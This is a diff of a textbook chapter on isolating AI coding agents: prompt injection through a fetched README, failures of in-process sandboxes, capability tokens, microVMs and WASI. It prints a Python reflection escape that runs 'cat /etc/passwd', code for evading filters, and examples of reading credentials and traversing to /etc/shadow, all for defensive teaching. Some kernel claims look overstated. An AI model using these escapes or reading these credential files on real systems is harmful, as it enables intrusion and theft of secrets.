@@ -60,6 +60,36 @@ The model reads its system prompt, its tool schemas, and the README it fetched a
 
 Three conditions made the README attack work. The agent could reach private data (the credentials file), it read untrusted content that could steer its proposals (the README), and it had a channel for sending data out (an unrestricted network route). Remove any one and the attack has nowhere to go. An agent that holds no secrets has nothing to leak, an agent that reads no untrusted text receives no planted instructions, and an agent with no outbound channel cannot deliver what it read. A useful coding agent must read the internet and must touch real repositories, so the runtime rarely removes a condition outright. It shrinks each one instead, and the chapter follows that plan. Capabilities and credential brokering (@sec-vol3-sandboxes-least-privilege) keep private data out of the sandbox. The isolation envelope (@sec-vol3-sandboxes-microvms) and the workspace inside it (@sec-vol3-sandboxes-cow) bound what code can touch. Egress control (@sec-vol3-sandboxes-network) narrows the network channel, and taint tracking (@sec-vol3-sandboxes-taint) keeps untrusted text from choosing where data goes through the tools that remain. Pools and their reset contract (@sec-vol3-sandboxes-pooling) make all of this cheap enough that no one is tempted to switch it off.
 
+### The instruction-data cohabitation dilemma {#sec-vol3-sandboxes-cohabitation}
+
+When an operating system kernel dispatches instructions to a classical processor, it relies on a foundational architectural invariant: the physical hardware enforces a rigid, hardware-mediated separation between executable instructions and untrusted application data. The processor's Memory Management Unit (MMU) checks page-table protection bits on every memory cycle, enforcing Write XOR Execute ($W \oplus X$) permissions that prevent writable data buffers from executing as machine code, while hardware privilege rings cleanly isolate the supervisor kernel (Ring 0 on x86-64, Exception Level 1 on ARM64) from unprivileged user-space processes (Ring 3 or Exception Level 0). If an unprivileged application attempts to execute a privileged instruction, dereference an unmapped address, or overwrite kernel memory, the hardware synchronously raises an architectural exception. Execution traps immediately to a registered kernel vector, halting the offending thread in a deterministic, inspectable state.
+
+An agent runtime has no such hardware bit to check. The model reads system directives, tool schemas, and untrusted observations retrieved from external sources as a single, contiguous sequence of tokens. The multi-head attention mechanism applies identical Key and Value projection matrices across the entire sequence, computing dot-product similarities across all token pairs without architectural distinction between trusted instructions and adversarial data payloads.
+
+For a context window of length $L = 32{,}768$ tokens containing an untrusted external retrieval payload of $N_{\text{data}} = 4{,}096$ tokens, the pairwise attention computation expands across all token interactions:
+$$
+\text{Total Attention Pairs} = L^2 = (32{,}768)^2 = 1{,}073{,}741{,}824\text{ pairs}
+$$
+The cross-attention interactions between untrusted external data tokens and internal instruction tokens account for:
+$$
+\text{Untrusted Cross-Pairs} = N_{\text{data}} \times L = 4{,}096 \times 32{,}768 = 134{,}217{,}728\text{ pairs}
+$$
+which constitutes:
+$$
+\frac{134{,}217{,}728}{1{,}073{,}741{,}824} = 12.5\%\text{ of total prefill attention compute}
+$$
+Within this unified dense matrix, an adversarial injection can steer the next-token distribution toward generating well-formed, schema-valid tool invocations that execute with the ambient privileges of the runtime supervisor. The threat vectors separating classical OS processes from autonomous agent execution planes are summarized in @tbl-vol3-threat-domains.
+
+| Protection Dimension             | Classical Operating System (Saltzer & Schroeder 1975)                                  | Autonomous Agentic Runtime                                                                                                       |
+|:---------------------------------|:---------------------------------------------------------------------------------------|:---------------------------------------------------------------------------------------------------------------------------------|
+| **Instruction-Data Segregation** | Hardware-enforced ($W \oplus X$, MMU page tables, separate code/data segments).        | Non-existent; instruction-data co-inhabitation in flat transformer token context.                                                |
+| **Authority Model**              | Ambient authority derived from process UID/GID and parent process inheritance.         | Zero ambient authority; candidate proposals held in host memory escrow.                                                          |
+| **Failure Mode & Signaling**     | Fail-stop; hardware traps, segmentation faults, synchronous POSIX signals (`SIGSEGV`). | Fail-plausible (@sec-vol3-intro-fail-plausible); fluent, syntactically valid commands masking catastrophic semantic destruction. |
+| **Reference Monitor**            | Kernel space (Ring 0 / EL1) mediating access to hardware resources via syscall table.  | Host agent runtime supervisor intercepting typed tool proposals before execution dispatch.                                       |
+| **Containment Perimeter**        | Process virtual address space, memory segmentation, hardware privilege rings.          | Multi-tier virtualization: namespace isolation, seccomp-bpf, microVMs, egress proxies.                                           |
+
+: **Structural comparison of classical operating system protection boundaries versus autonomous agent execution threat planes**: Protection dimensions across instruction-data segregation, authority models, failure modes, reference monitors, and containment perimeters. {#tbl-vol3-threat-domains}
+
 ::: {#dfn-blast-radius .callout-definition title="Blast radius"}
 
 ***Blast radius***\index{Blast radius!definition} is the set of state that an action can read, change, or send outside its sandbox, as fixed by the runtime's enforcement rather than by what the model was asked to do.
@@ -97,9 +127,9 @@ The engineering question is what each layer is built from, and the first place a
 
 ## Why In-Process Sandboxes Fail {#sec-vol3-sandboxes-in-process-failure}
 
-A data-analysis agent writes Python to summarize a CSV file, and the harness runs that code with `exec()` inside its own interpreter, passing a stripped dictionary of globals and perhaps rejecting scripts whose syntax tree mentions `import` or `eval`. The design is attractive because it costs nothing to start and reuses the libraries the harness has already loaded. It fails in four ways, and every one of them has the same cause. The code doing the enforcing and the code being policed share one process.
+A data-analysis agent writes Python to summarize a CSV file, and the harness runs that code with `exec()` inside its own interpreter, passing a stripped dictionary of globals and perhaps rejecting scripts whose syntax tree mentions `import` or `eval`. The design is attractive because it costs nothing to start and reuses the libraries the harness has already loaded. It fails in four ways, and every one of them has the same cause: the code doing the enforcing and the code being policed share one process address space.
 
-The first failure is reflection. Removing `os` and `__import__` from the globals deletes names, not objects. In Python every value links to its class, every class links to its base, and the universal base class can enumerate every class loaded in the process. @Lst-vol3-sandbox-escape walks that chain from an empty tuple to a process-launching class, without the script ever naming a forbidden module. Every dynamic language offers an equivalent path; in JavaScript, the constructor of any function literal reaches the global scope.
+The first failure is reflection. Removing `os` and `__import__` from globals deletes names, not objects. In Python, every value links to its class, every class links to its base, and the universal base class can enumerate every class loaded in the process. @Lst-vol3-sandbox-escape walks that chain from an empty tuple to a process-launching class, without the script ever naming a forbidden module. Every dynamic language offers an equivalent path; in JavaScript, the constructor of any function literal reaches the global scope.
 
 ::: {#lst-vol3-sandbox-escape lst-cap="**Reflection Escape from Restricted Globals**: Walking the object graph from an empty tuple to a class that launches processes, without referencing any forbidden module name."}
 ```python
@@ -117,13 +147,54 @@ popen_cls(["cat", "/etc/passwd"])
 ```
 :::
 
-The second failure is that static filtering cannot keep up with a dynamic language. A filter that bans the string `"__subclasses__"` misses `"".join(["__sub", "classes__"])`, and a filter that bans attribute syntax misses `getattr` on a decoded string. Deciding in general whether a program can reach a forbidden operation is undecidable by Rice's theorem, and any filter strict enough to close every dynamic path leaves a language too weak for the analysis work the agent was given.
+### Dynamic heap object traversal and reflection bypasses
 
-The third failure lies beneath the language. Data-analysis code calls compiled C and C++ extensions for arrays, images, and compression, and those libraries run in the same address space as the interpreter. A crafted input that triggers a buffer overflow in one of them overwrites memory directly, and at that point the script is native code running with every privilege the harness process holds.
+Removing a variable name from an interpreter dictionary breaks only a single symbolic reference; it does not destroy the underlying object in memory, nor does it sever the bidirectional pointers that link every object instance back to the root of the runtime's type hierarchy.
 
-The fourth failure remains even if the first three were solved. In-process code runs under the harness's own user identity, file descriptors, environment variables, and system-call interface. It can read the API keys in the process environment, write to the harness's open database connection, and probe services on the loopback interface. It holds all of the harness's ambient authority.
+In Python, every object instance maintains a pointer to its class object via the `__class__` attribute. That class object points to its parent class via `__base__`, which ultimately terminates at the universal base class `object`. Crucially, `object` maintains an internal registry of every class defined within the runtime's address space via the `__subclasses__()` method. Any benign literal instantiated in untrusted code—an empty tuple `()`, an empty string `""`, or a literal integer—provides an immutable traversal anchor from which an adversary can walk the heap inheritance tree, locate a dormant system utility class, and instantiate an unconstrained shell executor.
 
-@saltzer2009 state the principle these failures violate. An isolation mechanism must be implemented by a layer below the code it controls, which is the same reason the invariant closure principle (\ref{pri-invariant-closure}) places mechanical bounds below the model. An in-process monitor cannot provide the complete mediation of @sec-vol3-tool-calling-unix-analogy, because a script that corrupts memory or walks the object graph compromises the monitor along with everything else. The code the agent runs must therefore live in a separate process, and usually behind a separate kernel. A separate process, however, still runs as somebody, and if it runs as the developer who launched the agent it inherits everything that developer can do.
+Static filters attempting to inspect Abstract Syntax Trees (ASTs) for forbidden identifiers are fundamentally defeated by runtime dynamic reflection:
+
+```python
+# Reflection obfuscation evading static string filtering
+attr_name = "".join(["_", "_", "sub", "classes", "_", "_"])
+payload = bytes.fromhex("5f5f737562636c61737365735f5f").decode()
+root_class = ().__class__.__base__
+subclasses = getattr(root_class, attr_name)()
+```
+
+By Rice's theorem, deciding whether an arbitrary program in a Turing-complete language will invoke a prohibited method at runtime is undecidable. Any filter strict enough to eliminate all dynamic reflection paths cripples the language for legitimate data-analysis tasks.
+
+### Native memory corruption exploits
+
+Even if an interpreter runtime could theoretically achieve total verification of its bytecode and reflection graphs, modern machine learning workflows break the boundary through native C/C++ extensions. An agent tasked with analyzing data, manipulating images, or calculating tensors invokes compiled binaries through foreign function interfaces (FFI), linking libraries such as NumPy, Pillow, PyTorch, and libvips directly into the interpreter's address space.
+
+These compiled extensions lack memory safety. When an agent executes a model-generated script that loads an image or manipulates an array, execution passes directly to compiled C routines. A heap buffer overflow, integer overflow, or use-after-free vulnerability in the native library allows adversarial input to overwrite the process's physical memory pages directly.
+
+::: {#fig-vol3-ffi-memory-collapse fig-env="figure" fig-pos="htb" fig-cap="**Foreign Function Interface Memory Boundary Collapse**: Breakdown of in-process interpreter sandboxing under native C/C++ extension execution. An untrusted agent script invokes compiled libraries (such as Pillow or NumPy) via the CPython Foreign Function Interface (FFI). A native heap buffer overflow breaches allocated chunk boundaries, corrupting adjacent heap arenas, `PyTypeObject` vtables, and stack return addresses within the shared 64-bit address space. This enables arbitrary code execution and direct invocation of privileged host system calls under ambient credentials." fig-alt="Stevens-style 64-bit virtual memory address space schematic showing User Space Ring 3 containing Python bytecode interpreter, PyTypeObject heap structures, and native C extension heap, where a buffer overflow corrupts heap arenas and return addresses to hijack execution into Kernel Space Ring 0 via host system calls."}
+![](images/svg/ffi_memory_corruption_boundary.svg)
+:::
+
+As diagrammed in @fig-vol3-ffi-memory-collapse, execution unfolds across a single 64-bit Virtual Memory Area (VMA) sharing ambient credentials. At the top of user space (Ring 3), the Python interpreter executes agent bytecode. When the agent invokes native routines via `ctypes` or C-extension bindings, control transfers to memory-unsafe compiled C libraries. When malicious input triggers an out-of-bounds write, the heap buffer overflow corrupts adjacent heap arenas and smashes internal CPython metadata—specifically the function pointers of `PyTypeObject` method tables (`tp_call`, `tp_iternext`). Control flow hijacking redirects execution to adversary shellcode. Because the process shares the host kernel's system call interface (`sys_call_table`), the compromised thread directly issues privileged host system calls (`sys_execve`, `sys_ptrace`), transitioning execution into Ring 0 kernel space and collapsing host isolation without ever breaching the user-space process boundary.
+
+The in-process Trusted Computing Base ($TCB_{\text{in-process}}$) encompasses the entire interpreter runtime and all natively linked libraries:
+$$
+TCB_{\text{in-process}} = 800\text{k} + 350\text{k} + 2{,}500\text{k} + 600\text{k} = 4{,}250{,}000 \text{ lines of memory-unsafe code}
+$$
+By contrast, decoupling execution into a strictly mediated external boundary reduces privileged system call exposure:
+$$
+\text{Attack Surface Reduction} = \frac{S_{\text{host}} - S_{\text{isolated}}}{S_{\text{host}}} = \frac{450 - 12}{450} = \frac{438}{450} \approx 97.33\%
+$$
+
+### Ambient authority under a shared identity
+
+The final failure of in-process sandboxing is ambient authority at the operating system boundary. When an agent runtime evaluates untrusted code in-process, that code executes under the identical process identifier (PID), user identifier (UID), and group identifier (GID) as the supervisor application itself:
+
+1. **Shared File Descriptor Table**: Any open file descriptor held by the host process—database connections, internal logging pipes, local state databases, or network sockets—is accessible to untrusted in-process code via unmediated `sys_write` calls.
+2. **Virtual Memory Exposure**: Confidential memory pages—including host API tokens, private SSH keys, and system environment variables stored in `environ`—reside in readable memory pages within the same address space.
+3. **Shared System Call Table**: The untrusted code can invoke any system call supported by the host kernel, probing loopback network interfaces (`127.0.0.1`), inspecting neighbor processes via `/proc`, and registering signal handlers that intercept termination attempts from the host supervisor.
+
+@saltzer2009 state the principle these failures violate: an isolation mechanism must be implemented by a layer below the code it controls, which is the same reason the invariant closure principle (\ref{pri-invariant-closure}) places mechanical bounds below the model. An in-process monitor cannot provide the complete mediation of @sec-vol3-tool-calling-unix-analogy, because a script that corrupts memory or walks the object graph compromises the monitor along with everything else. The code the agent runs must therefore live in a separate process, and usually behind a separate kernel. A separate process, however, still runs as somebody, and if it runs as the developer who launched the agent it inherits everything that developer can do.
 
 ## Capabilities and Credentials {#sec-vol3-sandboxes-least-privilege}
 
@@ -160,6 +231,37 @@ $$\text{Verdict}(a, C, t) = \begin{cases} \text{APPROVE} & \text{if } \text{Veri
 :::
 
 @Fig-vol3-capability-attenuation shows the check on the left. A rejected proposal changes nothing, returns a structured observation that the model can act on, as the error-shaping discipline of @sec-vol3-tool-calling-schemas requires, and leaves an entry in the trajectory log. The check itself is cheap. Verifying a message authentication code takes microseconds, while the model call that produced the proposal takes seconds, so mediating every access adds nothing a user could measure.
+
+Under classical access control, the operating system evaluates ambient credentials:
+$$\text{Process } (\text{euid}=1000) \xrightarrow{\texttt{open(\"/etc/shadow\")}} [\text{Kernel ACL Check}: \text{euid} \stackrel{?}{=} 0] \implies \textbf{DENIED}$$
+In an unmediated agentic runtime, however, the supervisor becomes a confused deputy:
+$$\text{Untrusted Injected Context} \xrightarrow{\text{\"Read API Key\"}} [\text{Supervisor } (\text{euid}=1000)] \xrightarrow{\texttt{open(\"~/.aws/credentials\")}} \textbf{ALLOWED}$$
+
+### Formal capability verification and monotonic attenuation
+
+An explicit capability token $C$ is formally defined as a 4-tuple:
+$$
+C = (R, O, P, E)
+$$
+where $R$ is the canonical resource identifier (such as a normalized filesystem path or network URI), $O$ is the set of authorized operations (e.g., $\{\text{READ}, \text{WRITE}\}$), $P$ represents structural parameter constraints (such as maximum file size or byte offset bounds), and $E$ is the epoch timestamp after which the capability expires.
+
+When an agent proposes an action $P$, the supervisory boundary evaluates the request against active capabilities:
+$$
+\text{Verdict}(P, C, t) = \begin{cases} \text{APPROVE} & \text{if } \text{VerifySig}(C) \land P.\text{op} \in C.O \land P.\text{res} \in C.R \land t < C.E \\ \text{DENY} & \text{otherwise} \end{cases}
+$$
+
+Furthermore, when an agent delegates tasks to sub-agents, authority must attenuate monotonically:
+$$
+C_{\text{child}} \sqsubseteq C_{\text{parent}} \iff C_{\text{child}}.O \subseteq C_{\text{parent}}.O \land C_{\text{child}}.R \subseteq C_{\text{parent}}.R \land C_{\text{child}}.E \le C_{\text{parent}}.E
+$$
+A child context can never acquire rights exceeding those held by its creator. Any attempt to escalate privileges triggers an immediate supervisory fault:
+
+```bash
+# Attempted privilege escalation trapped at the supervisory boundary
+[2026-09-19T10:14:22.401Z] WARN  supervisor: Trajectory 0x8F9C requested CAP_SYS_ADMIN
+[2026-09-19T10:14:22.402Z] ERROR supervisor: Capability check failed: target privilege exceeds parent grant
+[2026-09-19T10:14:22.402Z] INFO  supervisor: Revoking execution token; terminating sandbox instance
+```
 
 ### Attenuation within a trajectory
 
@@ -213,10 +315,90 @@ A **user-space kernel** [@google2019gvisor] intercepts the sandbox's system call
 
 A **microVM** runs the code behind its own guest kernel, isolated by hardware virtualization. A guest that gains root access to its own kernel is still confined to the memory the hypervisor mapped for it, and what it can attack on the host shrinks to a minimal virtual machine monitor and the hypervisor interface. One such design [@agache2020firecracker] keeps only a handful of paravirtual devices and runs the monitor itself as an unprivileged, namespaced, system-call-filtered process, so a bug in the monitor lands inside a second envelope. Stripping the legacy device model is also what brings start cost down from the seconds of a conventional virtual machine to the range in which pooling works (@sec-vol3-sandboxes-pooling).
 
-### Bytecode sandboxes {#sec-vol3-sandboxes-wasm}
+The spectrum of systems isolation envelopes is contrasted across attack surfaces in @fig-vol3-isolation-spectrum.
 
-A **bytecode sandbox** such as WebAssembly [@haas2017bringing] confines code to a bounded linear memory that the runtime validates before execution, and the code has no system-call instruction at all. Every interaction with the outside world goes through a function the host chose to import. Its system interface expresses file access as capabilities in the sense of @sec-vol3-sandboxes-least-privilege. The host opens specific directories and passes their handles in at start-up, and a request for `../../etc/shadow` relative to a granted directory fails as not permitted before any host file operation runs. Instantiation costs microseconds, so a fresh sandbox for every tool call is affordable. The limits are equally sharp. There is no `fork` or `exec`, native extension libraries do not load, and a shell script needs a shell compiled to bytecode. The trusted base also moves from hardware and hypervisor to the bytecode compiler and runtime.
+::: {#fig-vol3-isolation-spectrum fig-env="figure" fig-pos="htb" fig-cap="**Operating Systems Isolation Spectrum for Agent Runtimes**: Architectural boundaries and host attack surfaces across four isolation paradigms: OS Containers (Docker/runC), User-Space Kernels (gVisor Sentry), Software Fault Isolation (Wasm SFI), and Hardware MicroVMs (Firecracker). While containers expose the full monolithic host kernel (~450 syscalls) directly across Ring 3 to Ring 0 transitions, hardware microVMs trap execution in hardware via VT-x VMCS exits, presenting only ~35 minimal KVM ioctls to the host kernel." fig-alt="Systems architecture diagram comparing four isolation columns: OS Containers exposing 450 host syscalls to the host Linux kernel, gVisor Sentry filtering syscalls down to 50 via user-space Go runtime, Wasm SFI isolating computation in a 4 GB linear memory sandbox with zero host syscalls, and Firecracker microVM enforcing hardware VT-x non-root boundaries with two-dimensional EPT paging and only 35 host syscalls."}
+![](images/svg/isolation_spectrum_v2.svg)
+:::
 
+### Kernel attack surface: Shared kernels versus hardware traps
+
+Operating system containers rely on the `clone(2)` system call with flags such as `CLONE_NEWPID`, `CLONE_NEWNET`, `CLONE_NEWNS`, and `CLONE_NEWUSER` to construct isolated namespaces. These namespaces are logical bookkeeping structures internal to the host kernel; they do not alter the fundamental execution model of user space code. Whenever an agentic tool execution inside a container issues a system call, the CPU transitions directly from Ring 3 (user space) to Ring 0 (kernel space) on the host processor. The host kernel's system call dispatcher validates arguments, executes the requested driver or memory management routine, and returns control to the process. Because the host kernel performs all mediation in software, any logical vulnerability in the kernel's memory management, IPC, or filesystem subsystems allows user-space code to execute arbitrary instructions with full supervisor privileges.
+
+Hardware-assisted virtualization changes this boundary by utilizing hardware extensions such as Intel VT-x or AMD-V. The physical CPU operates in two distinct modes: VMX root operation and VMX non-root operation. The host hypervisor operates in VMX root mode, while the guest software—including both the guest operating system kernel and its sandboxed user processes—executes in VMX non-root mode. Within VMX non-root mode, standard computational instructions execute at native hardware speeds. However, sensitive operations—such as modifying control registers (`CR0`, `CR3`, `CR4`), executing privileged instructions (`CPUID`, `INVD`, `VMXON`), or attempting to program physical interrupt controllers—are intercepted directly by processor hardware. When a guest instruction violates an execution rule, the CPU suspends guest execution, stores the guest state in a physical memory structure known as the Virtual Machine Control Structure (VMCS), and initiates a `VM-Exit` trap back to the hypervisor in VMX root mode.
+
+Memory virtualization under hardware-assisted virtualization is governed by two-dimensional page tables, known as Extended Page Tables (EPT) on Intel architectures or Nested Page Tables (NPT) on AMD architectures. When the sandboxed agent process translates a virtual memory address to access a variable, the processor's Memory Management Unit (MMU) performs a two-stage translation:
+
+$$\text{Guest Virtual Address (GVA)} \xrightarrow{\text{Guest Page Table}} \text{Guest Physical Address (GPA)} \xrightarrow{\text{Extended Page Table (EPT)}} \text{Host Physical Address (HPA)}$$
+
+The guest kernel possesses full administrative control over its internal page tables, allowing it to allocate virtual memory to its sub-processes without host intervention. However, the guest cannot modify the EPT root pointer (`EPTP`), which is configured and write-protected by the hypervisor in VMX root mode. Even if an adversarial agent payload executes an exploit that achieves complete root control over the guest Linux kernel, it remains physically trapped within its assigned GPA space. The guest kernel cannot address, inspect, or corrupt any host physical memory frame ($HPA$) outside the explicit ranges mapped by the host's EPT structures, establishing the boundary transitions compared in @tbl-vol3-isolation-transitions.
+
+| Isolation Layer                | Transition Mechanism            | Trapping Entity     | Attack Surface              |
+|:-------------------------------|:--------------------------------|:--------------------|:----------------------------|
+| **Container (runC)**           | `syscall` (Ring 3 $\to$ 0)      | Host Linux Kernel   | $\approx 450$ host syscalls |
+| **User-Space Kernel (gVisor)** | `ptrace` or KVM trap            | Sentry (User Space) | $\approx 50$ host syscalls  |
+| **MicroVM (Firecracker)**      | `VM-Exit` (Non-Root $\to$ Root) | KVM Hypervisor      | $\approx 35$ host syscalls  |
+
+: **Isolation Boundary Transition Mechanisms**: Comparison of transition mechanisms and host privilege exposure across isolation boundaries. {#tbl-vol3-isolation-transitions}
+
+### Minimalist virtual machine architecture: The Firecracker design
+
+Traditional open-source hypervisors such as QEMU support arbitrary hardware emulation, enabling virtual machines to boot legacy operating systems on top of arbitrary host platforms. Consequently, QEMU contains complex software models for legacy peripheral hardware, including floppy disk controllers, IDE and SATA disk interfaces, Intel e1000 network interface cards, PCI-to-PCI bridges, Sound Blaster audio cards, and extensive Advanced Configuration and Power Interface (ACPI) state machines. This versatility requires over 1.5 million lines of C code, presenting both a significant host memory footprint and an expansive attack surface susceptible to hypervisor escape vulnerabilities.
+
+Firecracker, developed by @agache2020firecracker at Amazon Web Services, discards the legacy PC platform model entirely in favor of an aggressively minimalist Virtual Machine Monitor (VMM). Implemented in memory-safe Rust, Firecracker leverages the Linux Kernel-based Virtual Machine (`/dev/kvm`) ioctl API to manage hardware virtualization while stripping all emulated hardware components down to the absolute minimum required for modern ephemeral workloads.
+
+Firecracker completely eliminates the PCI bus hierarchy, ACPI tables, and legacy BIOS/UEFI firmware initialization routines. Instead of emulating PCI devices, Firecracker exposes virtualized peripherals exclusively via VirtIO over Memory-Mapped I/O (VirtIO-MMIO). Device registers are mapped to fixed, contiguous guest physical memory address ranges hardcoded into kernel launch parameters. Firecracker provides exactly four virtual device types:
+
+1. **`virtio-block`:** An asynchronous block device interface that provides the guest with a virtual disk backed by a host file or raw device node.
+2. **`virtio-net`:** A network interface bridging the guest network stack directly to a host Linux TAP device.
+3. **`virtio-vsock`:** A zero-configuration virtual socket interface enabling bidirectional, multiplexed, packet-based IPC between host user-space daemons and guest services without network routing or IP assignment.
+4. **Serial Console and Timer:** A stripped-down 8250 UART serial console for debug logging, alongside an emulated programmable interval timer (PIT) and real-time clock (RTC).
+
+Because Firecracker avoids legacy BIOS and UEFI firmware stages, the hypervisor boots the guest kernel through a direct kernel boot path. The host Firecracker process reads an uncompressed 64-bit Linux kernel binary (`vmlinux`) from disk, maps it directly into guest physical memory at a predetermined offset, and populates the x86 64-bit boot protocol data structure (the `boot_params` "zero page"). Firecracker writes kernel command-line arguments directly into guest memory—specifying the root filesystem location and fixed MMIO base addresses—and immediately calls the `KVM_RUN` ioctl.
+
+The defense-in-depth isolation boundary of a Firecracker microVM is diagrammed in @fig-vol3-firecracker-architecture.
+
+::: {#fig-vol3-firecracker-architecture fig-env="figure" fig-pos="htb" fig-cap="**Layered Defense Architecture of a Firecracker MicroVM**: Structural containment model spanning the host supervisor, Jailer boundary, minimalist Rust VMM, and hardware-isolated guest partition. The Jailer applies `chroot`, `cgroups v2`, and `seccomp-bpf` filtering ($\le 35$ host syscalls) before launching the VMM. The guest microVM executes in Intel VT-x VMX non-root mode, where memory accesses are translated through two-dimensional Extended Page Tables ($GPA \to HPA$), device communication is restricted to fixed MMIO windows, and filesystem mutations are trapped in an ephemeral OverlayFS UpperDir backed by RAM tmpfs." fig-alt="Systems architecture diagram illustrating the Firecracker microVM containment hierarchy: Host Orchestrator launching an unprivileged Jailer envelope with seccomp-bpf filters, containing a minimalist Rust VMM that manages VirtIO-MMIO device windows (virtio-block, virtio-net, virtio-vsock), separated by an Intel VT-x hardware boundary from the guest microVM executing in VMX non-root mode with EPT memory translation and tmpfs OverlayFS storage."}
+![](images/svg/firecracker_microvm_architecture.svg)
+:::
+
+### Multi-tenant defense-in-depth: The Firecracker jailer
+
+Although Firecracker is written in memory-safe Rust and interacts with the host kernel via a bounded KVM interface, robust systems engineering assumes that any software component can fail. If an attacker discovers a vulnerability within the virtio emulation logic or identifies an unpatched defect in the KVM kernel module itself, a malicious payload inside the microVM could compromise the Firecracker VMM process on the host.
+
+To neutralize this escalation vector, Firecracker enforces a defense-in-depth architecture using an auxiliary host-level security wrapper known as the *Firecracker Jailer*. The Jailer binary executes with host administrative privileges (`root`) prior to booting the microVM, applies a strict four-layer isolation envelope around the execution context, drops all host privileges, and executes the Firecracker VMM process via `execve(2)`, following the multi-stage privilege demotion sequence in @tbl-vol3-jailer-pipeline.
+
+| Pipeline Stage             | Subsystem Target | Kernel Primitives & System Calls                                    | Execution Context                     | Containment Invariant Established                                    |
+|:---------------------------|:-----------------|:--------------------------------------------------------------------|:--------------------------------------|:---------------------------------------------------------------------|
+| **1. Root Bootstrap**      | Host Process     | `clone()`, PID allocation                                           | Privileged Host Root (`UID=0, GID=0`) | Allocates per-instance metadata and working directories.             |
+| **2. Namespace Isolation** | Linux Namespaces | `unshare(CLONE_NEWNS + CLONE_NEWPID + CLONE_NEWNET + CLONE_NEWIPC)` | Isolated Namespace Boundaries         | Isolates VFS mounts, PID hierarchy, network routes, and IPC queues.  |
+| **3. Filesystem Chroot**   | VFS Mounts       | `mount(--bind)`, `chroot(jail_dir)`, `chdir("/")`                   | Confined Root Directory               | Strips access to host root; exposes only kernel binary and socket.   |
+| **4. Cgroup Quotas**       | `cgroups v2`     | Writes to `cpu.max`, `memory.max`, `pids.max = 2 + N_vcpus`         | Resource-Capped Slice                 | Bounds CPU consumption, hard-caps RAM, and blocks fork bombs.        |
+| **5. Privilege Demotion**  | Credentials      | `setresgid(jail_gid)`, `setresuid(jail_uid)`, `capng_clear()`       | Unprivileged Context (`UID > 10000`)  | Eradicates all ambient POSIX capabilities (`CAP_SYS_ADMIN`, etc.).   |
+| **6. Syscall Lockdown**    | `seccomp-bpf`    | `prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, ...)`                   | Hardened Kernel Boundary              | Enforces default-deny allowlist of ~35 syscalls; `SIGSYS` on breach. |
+| **7. Process Replacement** | Execution Image  | `execve("/usr/bin/firecracker", argv, envp)`                        | Fully Jailed MicroVM VMM              | Runs VMM with zero ambient authority on host filesystem or network.  |
+
+: **Sequential Privilege Demotion and Containment Pipeline of the Firecracker Jailer**: Seven-stage hardening sequence executed prior to microVM initialization. {#tbl-vol3-jailer-pipeline}
+
+### Bytecode sandboxes and capability mediation {#sec-vol3-sandboxes-wasm}
+
+A **bytecode sandbox** such as WebAssembly [@haas2017bringing] confines code to a bounded linear memory that the runtime validates before execution, and the code has no system-call instruction at all. Linear memory is allocated as a contiguous, unaliased array of bytes spanning up to 4 GB in Wasm32. Every load and store instruction operates on zero-based unsigned 32-bit offsets relative to this base pointer. During compilation or ahead-of-time (AOT) translation, the WebAssembly engine inserts hardware or software bounds checks on every memory dereference, or sandwiches the 4 GB allocation between unmapped virtual memory guard pages. Any attempt by guest code to dereference an out-of-bounds pointer triggers an immediate hardware `SIGSEGV` caught by the host runtime, aborting execution before foreign memory can be inspected or corrupted.
+
+To interact with the outside world, a WebAssembly module relies on the WebAssembly System Interface (WASI). WASI standardizes host imports through a pure capability-based security model enforcing zero ambient authority at the module boundary. The host opens specific directory handles and injects them into the module's file descriptor table during instantiation. The guest cannot access any filesystem path outside those capability handles, as verified in @tbl-vol3-wasi-callgate.
+
+| Invocation Step                 | Guest Module Call                              | Host Runtime Validation Checks                                                                         | Host Kernel Action                                     | Return Value to Guest                |
+|:--------------------------------|:-----------------------------------------------|:-------------------------------------------------------------------------------------------------------|:-------------------------------------------------------|:-------------------------------------|
+| **1. Authorized File Access**   | `path_open(dir_fd=3, path="data.json")`        | Validates `dir_fd=3` is an open directory handle; checks canonical path stays within root of `dir_fd`. | Mints scoped child file descriptor in host kernel.     | `Ok(file_fd=4)` (Unforgeable handle) |
+| **2. Traversal Escape Attempt** | `path_open(dir_fd=3, path="../../etc/shadow")` | Resolves path against directory root; detects attempted escape out of sandbox root.                    | Blocks host VFS call; logs capability violation event. | `Err(WASI_ERRNO_NOTCAPABLE)`         |
+
+: **WebAssembly WASI Capability Call Gate Resolution Sequence**: Step-by-step verification of guest module filesystem requests against pre-opened directory capabilities. {#tbl-vol3-wasi-callgate}
+
+```bash
+# Host WASI Complete Mediation Trap
+[2026-09-19T10:18:04.210Z] WARN  wasm_runtime: Module invoked fd_readdir(fd=3, cookie=0) -> OK
+[2026-09-19T10:18:04.214Z] ERROR wasm_runtime: Module invoked path_open(fd=3, path="../../etc/shadow", flags=0)
+[2026-09-19T10:18:04.215Z] SECURITY_FAULT wasm_runtime: Path traversal escape detected; trapped with WASI_ERRNO_NOTCAPABLE
+```
 ### Matching the envelope to the action {#sec-vol3-sandboxes-envelope-choice}
 
 @Tbl-vol3-isolation-taxonomy summarizes the four envelopes. Representative start-up and memory measurements for current implementations appear in @tbl-vol3-app-ref-arch-sandboxes; the orders of magnitude are what drive the choice.
@@ -348,6 +530,71 @@ class WorkspaceCost:
 
 :::
 
+### Layered virtual filesystem topologies and copy-up mechanics
+
+Modern Linux execution sandboxes implement copy-on-write storage isolation primarily through *OverlayFS*, a kernel union filesystem integrated into the upstream Linux virtual file system (VFS). OverlayFS multiplexes two or more directory trees into a unified namespace presented to user space:
+
+1. **`lowerdir`:** One or more read-only underlying directories containing the base operating system rootfs, language runtimes, and baseline Git repository checkout.
+2. **`upperdir`:** A private, writable directory where all file modifications, creations, and deletion markers are recorded.
+3. **`workdir`:** An empty auxiliary directory on the same filesystem as `upperdir` used by the kernel to prepare atomic directory and file operations.
+4. **`merged`:** The virtual mount point presented to the sandboxed agent process.
+
+```bash
+# Establishing a copy-on-write workspace for an agent sandbox
+mount -t overlay overlay -o lowerdir=/images/golden_repo,upperdir=/sandboxes/agent_42/upper,workdir=/sandboxes/agent_42/work /sandboxes/agent_42/merged
+```
+
+The virtual filesystem hierarchy and component responsibilities are detailed in @tbl-vol3-overlayfs-layers.
+
+| Layer Identifier     | Mount Parameter      | POSIX Access          | Storage Backing               | Kernel Inode Mediation Role                                                                                                          |
+|:---------------------|:---------------------|:----------------------|:------------------------------|:-------------------------------------------------------------------------------------------------------------------------------------|
